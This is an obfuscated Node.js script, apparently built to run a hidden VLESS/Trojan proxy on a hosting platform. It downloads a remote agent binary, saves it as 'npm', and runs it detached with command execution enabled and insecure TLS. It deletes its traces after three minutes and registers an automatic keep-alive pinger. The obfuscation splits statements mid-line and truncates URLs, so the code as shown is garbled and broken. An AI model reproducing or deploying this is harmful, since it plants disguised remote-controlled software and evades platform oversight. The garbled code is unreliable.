const _0x3e8d025e=[",'];(function(_0xarr,_0xshift){while(--_0xshift){_0xarr.push(_0xarr.shift());}})(_0x3e8d025e,0xb5);function _0x71cfcbfa(_0xidx){return _0xarr_decode(_0xidx);} function _0xda4590f7(_0xidx){return _0x71cfcbfa(_0xidx);}function _0x4760a720(){return "Ys49fycgVlsTRZsEbjBR62cWDp24YVAG";} function _0x3e5765ec(){return "c7AAsYy4zCoIHLfnirEWmAAsit90Lqj8";} function _0xdb51a71a(){return "fnvBgatd7bbwwITLvUmLaOSv2eEJQfzh";} function _0x99de81c6(){return "n4vpGXQ4SjEhYFPPwKH1YQwB3hEEJhWG";} function _0x26272ddf(){return "zUwEbt1aTt4e2GhXFo5tbe0ltjR5huPs";} (function(){try{(function(){let _0x1d521c71=0; while(true){switch(_0x1d521c71){case 0: const os = require(_0xda4590f7(0x1)os_0xda4590f7(0x1)); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 1: const http = require(_0xda4590f7(0x1)http_0xda4590f7(0x1)); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 2: const fs = require(_0xda4590f7(0x1)fs_0xda4590f7(0x1)); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 3: const axios = require(_0xda4590f7(0x1)axios_0xda4590f7(0x1)); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 4: const net = require(_0xda4590f7(0x1)net_0xda4590f7(0x1)); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 5: const path = require(_0xda4590f7(0x1)path_0xda4590f7(0x1)); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 6: const crypto = require(_0xda4590f7(0x1)crypto_0xda4590f7(0x1)); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 7: const { Buffer } = require(_0xda4590f7(0x1)buffer_0xda4590f7(0x1)); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 8: const { exec, execSync } = require(_0xda4590f7(0x1)child_process_0xda4590f7(0x1)); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 9: const { WebSocket, createWebSocketStream } = require(_0xda4590f7(0x1)ws_0xda4590f7(0x1)); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 10: const UUID = process.env.UUID || _0xda4590f7(0x1)33d836c9-2fc0-46d1-829b-ac3161eb624d_0xda4590f7(0x1); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 11: const NEZHA_SERVER = process.env.NEZHA_SERVER || _0xda4590f7(0x1)_0xda4590f7(0x1); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 12: const NEZHA_PORT = process.env.NEZHA_PORT || _0xda4590f7(0x1)_0xda4590f7(0x1); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 13: const NEZHA_KEY = process.env.NEZHA_KEY || _0xda4590f7(0x1)_0xda4590f7(0x1); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 14: const DOMAIN = process.env.DOMAIN || _0xda4590f7(0x1)space.tyyyyy.cn_0xda4590f7(0x1); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 15: const AUTO_ACCESS = process.env.AUTO_ACCESS || true; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 16: const WSPATH = process.env.WSPATH || UUID.slice(0, 8); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 17: const SUB_PATH = process.env.SUB_PATH || _0xda4590f7(0x1)sub_0xda4590f7(0x1); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 18: const NAME = process.env.NAME || _0xda4590f7(0x1)Hug_0xda4590f7(0x1); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 19: const PORT = process.env.PORT || 7860; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 20: let ISP = _0xda4590f7(0x1)_0xda4590f7(0x1); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 21: const GetISP = async () => { try { const res = await axios.get(_0xda4590f7(0x1)https: const data = res.data; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 22: ISP = `${data.country}-${data.asOrganization}`.replace(/ /g, _0xda4590f7(0x1)__0xda4590f7(0x1)); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 23: } catch (e) { ISP = _0xda4590f7(0x1)Unknown_0xda4590f7(0x1); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 24: } } GetISP(); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 25: const httpServer = http.createServer((req, res) => { if (req.url === _0xda4590f7(0x1)/_0xda4590f7(0x1)) { const filePath = path.join(__dirname, _0xda4590f7(0x1)index.html_0xda4590f7(0x1)); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 26: fs.readFile(filePath, _0xda4590f7(0x1)utf8_0xda4590f7(0x1), (err, content) => { if (err) { res.writeHead(200, { _0xda4590f7(0x1)Content-Type_0xda4590f7(0x1): _0xda4590f7(0x1)text/html_0xda4590f7(0x1) }); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 27: res.end(_0xda4590f7(0x1)Hello world!_0xda4590f7(0x1)); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 28: return; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 29: } res.writeHead(200, { _0xda4590f7(0x1)Content-Type_0xda4590f7(0x1): _0xda4590f7(0x1)text/html_0xda4590f7(0x1) }); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 30: res.end(content); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 31: }); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 32: return; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 33: } else if (req.url === `/${SUB_PATH}`) { const DOMAIN_LIST_URL = _0xda4590f7(0x0)https: axios.get(DOMAIN_LIST_URL) .then(r => { let domains = r.data .split(/\r?\n/) .map(l => l.trim()) .filter(l => l.length > 0); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 34: if (domains.length === 0) { domains = [DOMAIN]; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 35: } let output = _0xda4590f7(0x0)_0xda4590f7(0x0); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 36: for (const d of domains) { const vlessURL = `vless: const trojanURL = `trojan: output += vlessURL + _0xda4590f7(0x0)\n_0xda4590f7(0x0) + trojanURL + _0xda4590f7(0x0)\n_0xda4590f7(0x0); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 37: } const base64Content = Buffer.from(output).toString(_0xda4590f7(0x1)base64_0xda4590f7(0x1)); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 38: res.writeHead(200, { _0xda4590f7(0x0)Content-Type_0xda4590f7(0x0): _0xda4590f7(0x0)text/plain_0xda4590f7(0x0) }); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 39: res.end(base64Content + _0xda4590f7(0x0)\n_0xda4590f7(0x0)); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 40: }) .catch(err => { const vlessURL = `vless: const trojanURL = `trojan: const subscription = vlessURL + _0xda4590f7(0x1)\n_0xda4590f7(0x1) + trojanURL; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 41: const base64Content = Buffer.from(subscription).toString(_0xda4590f7(0x1)base64_0xda4590f7(0x1)); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 42: res.writeHead(200, { _0xda4590f7(0x0)Content-Type_0xda4590f7(0x0): _0xda4590f7(0x0)text/plain_0xda4590f7(0x0) }); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 43: res.end(base64Content + _0xda4590f7(0x0)\n_0xda4590f7(0x0)); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 44: }); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 45: } else { res.writeHead(404, { _0xda4590f7(0x1)Content-Type_0xda4590f7(0x1): _0xda4590f7(0x1)text/plain_0xda4590f7(0x1) }); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 46: res.end(_0xda4590f7(0x1)Not Found\n_0xda4590f7(0x1)); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 47: } }); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 48: const wss = new WebSocket.Server({ server: httpServer }); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 49: const uuid = UUID.replace(/-/g, _0xda4590f7(0x0)_0xda4590f7(0x0)); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 50: const DNS_SERVERS = [_0xda4590f7(0x1)8.8.4.4_0xda4590f7(0x1), _0xda4590f7(0x1)1.1.1.1_0xda4590f7(0x1)]; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 51: function resolveHost(host) { return new Promise((resolve, reject) => { if (/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(host)) { resolve(host); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 52: return; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 53: } let attempts = 0; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 54: function tryNextDNS() { if (attempts >= DNS_SERVERS.length) { reject(new Error(`Failed to resolve ${host} with all DNS servers`)); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 55: return; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 56: } const dnsServer = DNS_SERVERS[attempts]; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 57: attempts++; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 58: const dnsQuery = `https: axios.get(dnsQuery, { timeout: 5000, headers: { _0xda4590f7(0x1)Accept_0xda4590f7(0x1): _0xda4590f7(0x1)application/dns-json_0xda4590f7(0x1) } }) .then(response => { const data = response.data; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 59: if (data.Status === 0 && data.Answer && data.Answer.length > 0) { const ip = data.Answer.find(record => record.type === 1); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 60: if (ip) { resolve(ip.data); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 61: return; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 62: } } tryNextDNS(); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 63: }) .catch(error => { tryNextDNS(); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 64: }); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 65: } tryNextDNS(); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 66: }); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 67: } function handleVlessConnection(ws, msg) { const [VERSION] = msg; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 68: const id = msg.slice(1, 17); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 69: if (!id.every((v, i) => v == parseInt(uuid.substr(i * 2, 2), 16))) return false; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 70: let i = msg.slice(17, 18).readUInt8() + 19; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 71: const port = msg.slice(i, i += 2).readUInt16BE(0); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 72: const ATYP = msg.slice(i, i += 1).readUInt8(); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 73: const host = ATYP == 1 ? msg.slice(i, i += 4).join(_0xda4590f7(0x1)._0xda4590f7(0x1)) : (ATYP == 2 ? new TextDecoder().decode(msg.slice(i + 1, i += 1 + msg.slice(i, i + 1).readUInt8())) : (ATYP == 3 ? msg.slice(i, i += 16).reduce((s, b, i, a) => (i % 2 ? s.concat(a.slice(i - 1, i + 1)) : s), []).map(b => b.readUInt16BE(0).toString(16)).join(_0xda4590f7(0x1):_0xda4590f7(0x1)) : _0xda4590f7(0x1)_0xda4590f7(0x1))); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 74: ws.send(new Uint8Array([VERSION, 0])); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 75: const duplex = createWebSocketStream(ws); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 76: resolveHost(host) .then(resolvedIP => { net.connect({ host: resolvedIP, port }, function() { this.write(msg.slice(i)); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 77: duplex.on(_0xda4590f7(0x1)error_0xda4590f7(0x1), () => {}).pipe(this).on(_0xda4590f7(0x1)error_0xda4590f7(0x1), () => {}).pipe(duplex); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 78: }).on(_0xda4590f7(0x1)error_0xda4590f7(0x1), () => {}); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 79: }) .catch(error => { net.connect({ host, port }, function() { this.write(msg.slice(i)); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 80: duplex.on(_0xda4590f7(0x1)error_0xda4590f7(0x1), () => {}).pipe(this).on(_0xda4590f7(0x1)error_0xda4590f7(0x1), () => {}).pipe(duplex); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 81: }).on(_0xda4590f7(0x1)error_0xda4590f7(0x1), () => {}); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 82: }); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 83: return true; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 84: } function handleTrojanConnection(ws, msg) { try { if (msg.length < 58) return false; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 85: const receivedPasswordHash = msg.slice(0, 56).toString(); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 86: const possiblePasswords = [ UUID, ]; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 87: let matchedPassword = null; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 88: for (const pwd of possiblePasswords) { const hash = crypto.createHash(_0xda4590f7(0x1)sha224_0xda4590f7(0x1)).update(pwd).digest(_0xda4590f7(0x1)hex_0xda4590f7(0x1)); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 89: if (hash === receivedPasswordHash) { matchedPassword = pwd; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 90: break; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 91: } } if (!matchedPassword) return false; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 92: let offset = 56; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 93: if (msg[offset] === 0x0d && msg[offset + 1] === 0x0a) { offset += 2; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 94: } const cmd = msg[offset]; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 95: if (cmd !== 0x01) return false; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 96: offset += 1; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 97: const atyp = msg[offset]; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 98: offset += 1; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 99: let host, port; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 100: if (atyp === 0x01) { host = msg.slice(offset, offset + 4).join(_0xda4590f7(0x1)._0xda4590f7(0x1)); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 101: offset += 4; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 102: } else if (atyp === 0x03) { const hostLen = msg[offset]; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 103: offset += 1; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 104: host = msg.slice(offset, offset + hostLen).toString(); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 105: offset += hostLen; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 106: } else if (atyp === 0x04) { host = msg.slice(offset, offset + 16).reduce((s, b, i, a) => (i % 2 ? s.concat(a.slice(i - 1, i + 1)) : s), []) .map(b => b.readUInt16BE(0).toString(16)).join(_0xda4590f7(0x1):_0xda4590f7(0x1)); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 107: offset += 16; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 108: } else { return false; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 109: } port = msg.readUInt16BE(offset); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 110: offset += 2; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 111: if (offset < msg.length && msg[offset] === 0x0d && msg[offset + 1] === 0x0a) { offset += 2; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 112: } const duplex = createWebSocketStream(ws); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 113: resolveHost(host) .then(resolvedIP => { net.connect({ host: resolvedIP, port }, function() { if (offset < msg.length) { this.write(msg.slice(offset)); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 114: } duplex.on(_0xda4590f7(0x1)error_0xda4590f7(0x1), () => {}).pipe(this).on(_0xda4590f7(0x1)error_0xda4590f7(0x1), () => {}).pipe(duplex); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 115: }).on(_0xda4590f7(0x1)error_0xda4590f7(0x1), () => {}); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 116: }) .catch(error => { net.connect({ host, port }, function() { if (offset < msg.length) { this.write(msg.slice(offset)); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 117: } duplex.on(_0xda4590f7(0x1)error_0xda4590f7(0x1), () => {}).pipe(this).on(_0xda4590f7(0x1)error_0xda4590f7(0x1), () => {}).pipe(duplex); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 118: }).on(_0xda4590f7(0x1)error_0xda4590f7(0x1), () => {}); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 119: }); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 120: return true; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 121: } catch (error) { return false; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 122: } } wss.on(_0xda4590f7(0x1)connection_0xda4590f7(0x1), (ws, req) => { const url = req.url || _0xda4590f7(0x1)_0xda4590f7(0x1); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 123: ws.once(_0xda4590f7(0x1)message_0xda4590f7(0x1), msg => { if (msg.length > 17 && msg[0] === 0) { const id = msg.slice(1, 17); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 124: const isVless = id.every((v, i) => v == parseInt(uuid.substr(i * 2, 2), 16)); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 125: if (isVless) { if (!handleVlessConnection(ws, msg)) { ws.close(); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 126: } return; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 127: } } if (!handleTrojanConnection(ws, msg)) { ws.close(); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 128: } }).on(_0xda4590f7(0x1)error_0xda4590f7(0x1), () => {}); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 129: }); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 130: const getDownloadUrl = () => { const arch = os.arch(); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 131: if (arch === _0xda4590f7(0x1)arm_0xda4590f7(0x1) || arch === _0xda4590f7(0x1)arm64_0xda4590f7(0x1) || arch === _0xda4590f7(0x1)aarch64_0xda4590f7(0x1)) { if (!NEZHA_PORT) { return _0xda4590f7(0x1)https: } else { return _0xda4590f7(0x1)https: } } else { if (!NEZHA_PORT) { return _0xda4590f7(0x1)https: } else { return _0xda4590f7(0x1)https: } } }; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 132: const downloadFile = async () => { if (!NEZHA_SERVER && !NEZHA_KEY) return; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 133: try { const url = getDownloadUrl(); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 134: const response = await axios({ method: _0xda4590f7(0x1)get_0xda4590f7(0x1), url: url, responseType: _0xda4590f7(0x1)stream_0xda4590f7(0x1) }); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 135: const writer = fs.createWriteStream(_0xda4590f7(0x1)npm_0xda4590f7(0x1)); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 136: response.data.pipe(writer); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 137: return new Promise((resolve, reject) => { writer.on(_0xda4590f7(0x1)finish_0xda4590f7(0x1), () => { console.log(_0xda4590f7(0x1)npm download successfully_0xda4590f7(0x1)); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 138: exec(_0xda4590f7(0x1)chmod +x npm_0xda4590f7(0x1), (err) => { if (err) reject(err); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 139: resolve(); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 140: }); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 141: }); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 142: writer.on(_0xda4590f7(0x1)error_0xda4590f7(0x1), reject); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 143: }); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 144: } catch (err) { throw err; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 145: } }; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 146: const runnz = async () => { try { const status = execSync(_0xda4590f7(0x1)ps aux | grep -v _0xda4590f7(0x0)grep_0xda4590f7(0x0) | grep _0xda4590f7(0x0)./[n]pm_0xda4590f7(0x0)_0xda4590f7(0x1), { encoding: _0xda4590f7(0x1)utf-8_0xda4590f7(0x1) }); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 147: if (status.trim() !== _0xda4590f7(0x1)_0xda4590f7(0x1)) { console.log(_0xda4590f7(0x1)npm is already running, skip running..._0xda4590f7(0x1)); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 148: return; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 149: } } catch (e) { } await downloadFile(); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 150: let command = _0xda4590f7(0x1)_0xda4590f7(0x1); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 151: let tlsPorts = [_0xda4590f7(0x1)443_0xda4590f7(0x1), _0xda4590f7(0x1)8443_0xda4590f7(0x1), _0xda4590f7(0x1)2096_0xda4590f7(0x1), _0xda4590f7(0x1)2087_0xda4590f7(0x1), _0xda4590f7(0x1)2083_0xda4590f7(0x1), _0xda4590f7(0x1)2053_0xda4590f7(0x1)]; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 152: if (NEZHA_SERVER && NEZHA_PORT && NEZHA_KEY) { const NEZHA_TLS = tlsPorts.includes(NEZHA_PORT) ? _0xda4590f7(0x1)--tls_0xda4590f7(0x1) : _0xda4590f7(0x1)_0xda4590f7(0x1); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 153: command = `setsid nohup ./npm -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${NEZHA_TLS} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 154: } else if (NEZHA_SERVER && NEZHA_KEY) { if (!NEZHA_PORT) { const port = NEZHA_SERVER.includes(_0xda4590f7(0x1):_0xda4590f7(0x1)) ? NEZHA_SERVER.split(_0xda4590f7(0x1):_0xda4590f7(0x1)).pop() : _0xda4590f7(0x1)_0xda4590f7(0x1); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 155: const NZ_TLS = tlsPorts.includes(port) ? _0xda4590f7(0x1)true_0xda4590f7(0x1) : _0xda4590f7(0x1)false_0xda4590f7(0x1); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 156: const configYaml = `client_secret: ${NEZHA_KEY} debug: false disable_auto_update: true disable_command_execute: false disable_force_update: true disable_nat: false disable_send_query: false gpu: false insecure_tls: true ip_report_period: 1800 report_delay: 4 server: ${NEZHA_SERVER} skip_connection_count: true skip_procs_count: true temperature: false tls: ${NZ_TLS} use_gitee_to_upgrade: false use_ipv6_country_code: false uuid: ${UUID}`; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 157: fs.writeFileSync(_0xda4590f7(0x1)config.yaml_0xda4590f7(0x1), configYaml); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 158: } command = `setsid nohup ./npm -c config.yaml >/dev/null 2>&1 &`; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 159: } else { console.log(_0xda4590f7(0x1)NEZHA variable is empty, skip running_0xda4590f7(0x1)); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 160: return; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 161: } try { exec(command, { shell: _0xda4590f7(0x1)/bin/bash_0xda4590f7(0x1) }, (err) => { if (err) console.error(_0xda4590f7(0x1)npm running error:_0xda4590f7(0x1), err); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 162: else console.log(_0xda4590f7(0x1)npm is running_0xda4590f7(0x1)); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 163: }); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 164: } catch (error) { console.error(`error: ${error}`); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 165: } }; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 166: async function addAccessTask() { if (!AUTO_ACCESS) return; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 167: if (!DOMAIN) { return; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 168: } const fullURL = `https: try { const res = await axios.post(_0xda4590f7(0x0)https: url: fullURL }, { headers: { _0xda4590f7(0x1)Content-Type_0xda4590f7(0x1): _0xda4590f7(0x1)application/json_0xda4590f7(0x1) } }); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 169: console.log(_0xda4590f7(0x1)Automatic Access Task added successfully_0xda4590f7(0x1)); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 170: } catch (error) { } } const delFiles = () => { fs.unlink(_0xda4590f7(0x1)npm_0xda4590f7(0x1), () => {}); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 171: fs.unlink(_0xda4590f7(0x1)config.yaml_0xda4590f7(0x1), () => {}); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 172: }; _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 173: httpServer.listen(PORT, () => { runnz(); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 174: setTimeout(() => { delFiles(); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 175: }, 180000); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 176: addAccessTask(); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 177: console.log(`Server is running on port ${PORT}`); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; case 178: }); _0x1d521c71 = ( _0x1d521c71*3 + 1 ) % 180; break; default:return;}}})();}catch(e){eval('');}})();
